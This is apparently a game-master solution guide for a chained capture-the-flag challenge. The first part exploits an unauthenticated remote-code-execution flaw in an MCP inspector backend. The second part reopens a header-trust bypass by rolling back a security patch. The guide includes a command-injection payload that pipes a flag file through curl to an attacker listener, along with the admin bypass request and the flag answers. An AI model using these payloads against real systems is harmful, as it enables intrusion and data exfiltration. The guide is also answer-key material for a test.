# MCPJam — Solution (GM only)

A **two-part chained challenge in one deployment** (this folder). One container
runs both services; **challenge 2 requires challenge 1**.

| # | Files | Name | Difficulty | Flag |
|---|---|---|---|---|
| 1 | `challenge1.yml` / `challenge1.md` / `solution/solve1.py` | Jam Session | medium | `flag{mcpj4mm1n9}` |
| 2 | `challenge2.yml` / `challenge2.md` / `solution/solve2.py` | Rollback | medium | `flag{th3_pr353nt_c3113d_th3y_w4nt_th31r_53cur1ty_b4ck}` |

> `solution/rce.py` is a manual-testing helper, not part of either scripted
> solve: an interactive `mcpjam>$ ` shell that fires each line through the
> challenge-1 RCE and prints the output via its own built-in listener. Handy
> for poking around the box by hand while reviewing this challenge.

## Shared deployment

```bash
docker compose up -d --build      # FLAG + FLAG2 are set in docker-compose.yml
```

One container, two unprivileged users:

- **`appuser`** — MCPJam Inspector backend, public `:6274`. `/api/mcp/connect` is
  the challenge-1 RCE; every non-API route is reverse-proxied to the console.
- **`console`** — the **MCPJam Console**, loopback `:6280`. It owns
  `/opt/reactor/override.code` (mode `600`, unreadable by `appuser`). `/admin`
  returns the reactor override code, guarded by `authorizeAdmin()`.

`start.sh` (PID 1) writes `/flag.txt` (appuser-readable) and
`/opt/reactor/override.code` (console-only) from the env, then launches both
services as their users.

---

## Challenge 1 — Jam Session

**Bug:** CVE-2026-23744 / GHSA-232v-j27c-5pp6 — MCPJam Inspector ≤ 1.4.2
unauthenticated RCE. CWE-306. CVSS 9.8. Fixed in 1.4.3.

`src/server.js` is a **faithful minimal reproduction** of the v1.4.2 backend
(not the real Electron/Vite monorepo, which needs a headless Electron or
from-source Convex/Sentry build — too fragile for a live service). It is
byte-for-byte compatible on the exploit path with the real
`server/routes/mcp/connect.ts` at tag `v1.4.2`:

- binds `0.0.0.0` ("for Docker" — the exact CVE mistake),
- `POST /api/mcp/connect` takes `{ serverConfig: { command, args, env }, serverId }`
  with no auth and no validation,
- for a stdio server it `spawn()`s `command` + `args`,
- it attempts an MCP `initialize` handshake; an arbitrary command doesn't answer,
  so the connect returns HTTP 500 — but the process already ran (**blind RCE**),
- stamps `X-Powered-By: MCPJam-Inspector/1.4.2` on every response (the version
  fingerprint; the landing page itself is the proxied console).

### Intended solve

1. **Fingerprint** the `X-Powered-By` header → CVE-2026-23744 / GHSA advisory.
2. **Confirm the primitive:** `/api/mcp/connect` launches a stdio server = arbitrary
   process exec, unauthenticated.
3. **It's blind** — the spawned stdout isn't reflected; exfiltrate out-of-band via
   `/bin/sh -c`.
4. **Exfil `/flag.txt`** (the image has `curl`; the process runs as `appuser`):
   ```json
   {"serverId":"x","serverConfig":{"command":"/bin/sh",
     "args":["-c","cat /flag.txt | curl -s --data-binary @- http://YOU:4444/"],"env":{}}}
   ```
   Any outbound channel works (reverse shell, `wget --post-file`, DNS…).

`solution/solve1.py` starts a listener, fires the connect payload, prints the flag:

```bash
LHOST=$(docker network inspect mcpjam_default -f '{{ (index .IPAM.Config 0).Gateway }}')
python3 solution/solve1.py http://127.0.0.1:6274 --lhost "$LHOST" --lport 4444
# [+] FLAG: flag{mcpj4mm1n9}
```

At the event competitors use their own machine's IP as `--lhost`.

---

## Challenge 2 — Rollback

Requires the challenge-1 foothold (RCE as `appuser`).

**Setup:** the console is served from a git commit. `appuser` owns the working
checkout `/opt/console/staging` and can `git checkout` any commit, but a
`console`-owned deploy pipeline (`src/devops-cd.sh`) only ever serves the
**pristine** copy of the selected commit from a `console`-owned mirror
(`/opt/console/.release.git` — dotfile, hidden from a plain `ls`) into
`/opt/console/prod`, and only when told to via
a deploy trigger (`/opt/console/deploy.trigger`, a FIFO `appuser` can write to
but not read). So the foothold user can pick a real historical commit and
request a deploy, but **cannot make the console run code they wrote**
(verified: an injected commit isn't in the release mirror, so it's rejected and
the last valid version keeps serving).

**Vulnerability:** the console's latest commit (`v1.2.0`, deployed `HEAD`) is a
**security patch** — `/admin` used to trust an `X-Console-Role: operator` request
header, and the patch removed it. The pre-patch commit (`v1.1.0`) still has the
bypass. A random per-boot `CONSOLE_SECRET` makes the patched session check
unforgeable, so on the deployed version there is **no** way into `/admin` — you
must roll back.

### Intended solve

1. **Foothold** from challenge 1 → code exec as `appuser`.
2. **Recon:** find `/opt/console/staging`; read `README.md` (the deploy
   instructions — checkout + trigger) and `git log` / `CHANGELOG.md` (also
   public on GitHub). The `v1.2.0` entry announces the `/admin` header-trust
   fix; `git show` it to see the exact bypass.
3. **Revert** to the commit before the fix, then trigger a deploy:
   ```sh
   cd /opt/console/staging
   git checkout "$(git log -i --grep=security --format=%H | head -1)^"
   echo deploy > /opt/console/deploy.trigger
   ```
   devops-cd wakes up, confirms the commit is in the release mirror, and
   promotes the pristine `v1.1.0` into `/opt/console/prod`.
4. **Exploit** the reopened bypass:
   ```sh
   curl -H 'X-Console-Role: operator' http://TARGET:6274/admin
   # {"reactor_override_code":"flag{th3_pr353nt_c3113d_th3y_w4nt_th31r_53cur1ty_b4ck}"}
   ```

`solution/solve2.py` does the whole chain over HTTP — drives the challenge-1 RCE
to run the revert, then polls `/admin` with the header:

```bash
python3 solution/solve2.py http://127.0.0.1:6274
# [+] FLAG: flag{th3_pr353nt_c3113d_th3y_w4nt_th31r_53cur1ty_b4ck}
```

---

## Notes for review / deploy

- **Instance per team.** The revert mutates a shared `HEAD`; if teams share one
  container they can clobber each other (or re-patch to grief). Run **instanced**.
  The flag is a static string, so a manual-issue fallback is trivial.
- **No privilege escalation beyond the bugs:** `appuser` reads `/flag.txt` only;
  `/opt/reactor/override.code` is reachable solely through the reverted `/admin`.
  `no-new-privileges` is set; flags are never baked into an image layer.
